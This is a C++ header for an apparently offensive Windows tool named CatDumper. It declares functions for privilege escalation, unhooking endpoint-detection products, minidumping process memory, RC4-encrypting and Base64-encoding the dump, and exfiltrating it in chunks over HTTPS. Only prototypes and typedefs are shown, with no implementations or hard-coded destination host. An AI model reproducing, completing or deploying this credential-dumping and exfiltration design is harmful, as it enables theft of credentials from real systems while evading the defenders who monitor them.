#ifndef CATDUMPER_H
#define CATDUMPER_H

#define NOMINMAX

#include <windows.h>
#include <wincrypt.h>
#include <winhttp.h>
#include <dbghelp.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <processsnapshot.h>
#include <iostream>
#include <string>
#include <random>
#include <vector>
#include <chrono>
#include <thread>

#pragma comment (lib, "ntdll")
#pragma comment (lib, "crypt32")
#pragma comment (lib, "winhttp")
#pragma comment (lib, "dbghelp")

// Syscall prototypes
typedef BOOL(WINAPI* fLookupPrivilegeValueW)(
    IN LPCWSTR lpSystemName OPTIONAL,
    IN LPCWSTR lpName,
    OUT PLUID lpLuid
    );

typedef NTSTATUS(NTAPI* fNtAdjustPrivilegesToken)(
    IN HANDLE TokenHandle,
    IN BOOLEAN DisableAllPrivileges,
    IN PTOKEN_PRIVILEGES TokenPrivileges,
    IN ULONG PreviousPrivilegesLength,
    OUT PTOKEN_PRIVILEGES PreviousPrivileges OPTIONAL,
    OUT PULONG RequiredLength OPTIONAL
    );

typedef NTSTATUS(NTAPI* fRtlGetVersion)(
    OUT PRTL_OSVERSIONINFOW lpVersionInformation
    );

typedef NTSTATUS(NTAPI* fNtWriteVirtualMemory)(
    IN HANDLE ProcessHandle, 
    IN PVOID BaseAddress, 
    IN PVOID Buffer, 
    IN ULONG NumberOfBytesToWrite, 
    OUT PULONG NumberOfBytesWritten OPTIONAL
    );

// Variable prototypes for functions
extern const size_t dumpBufferSize;
extern LPVOID dumpBuffer;
extern DWORD bytesRead;

enum supported_versions {
    win8 = 0x060200,
    win81 = 0x060300,
    win10 = 0x0A0000,
};

// Callback prototype for in-memory processes
BOOL CALLBACK minidumpCallback(
    PVOID callbackParam,
    const PMINIDUMP_CALLBACK_INPUT callbackInput,
    PMINIDUMP_CALLBACK_OUTPUT callbackOutput
);

// Function prototype for error-checking
std::wstring GetLastErrorMessage();

// Function prototypes for string processing
std::wstring ASCIItoWString(const std::vector<int>& asciiValues);
std::string ASCIItoString(const std::vector<int>& asciiValues);

// Function prototype for privilege escalation to NT AUTHORITY\SYSTEM
BOOL SetPrivilege(LPCWSTR lpszPrivilege, BOOL bEnablePrivilege);

// Function prototypes for EDR unhooking
EXTERN_C NTSTATUS NTAPI NtReadVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
BYTE GetNtRVM();
VOID FreeNtRVM();

// Function prototypes for minidump processing
constexpr unsigned int numRNG();
std::string Keygen(int length);
std::string EncryptDump(LPVOID dumpBuffer, DWORD dumpBufferSize, const std::string& key);
void RC4(std::vector<char>& data, const std::string& key);
std::string Base64Encode(const std::string& input);

// Function prototypes for minidump exfiltration
std::vector<std::string> SplitDataIntoChunks(const std::string& data, size_t chunkSize);
bool SendHTTPSRequest(const std::string& hostname, const std::string& path, const std::string& data, bool isKey);
void SendDataInChunks(const std::string& data, const std::string& hostname, const std::string& path);

#endif
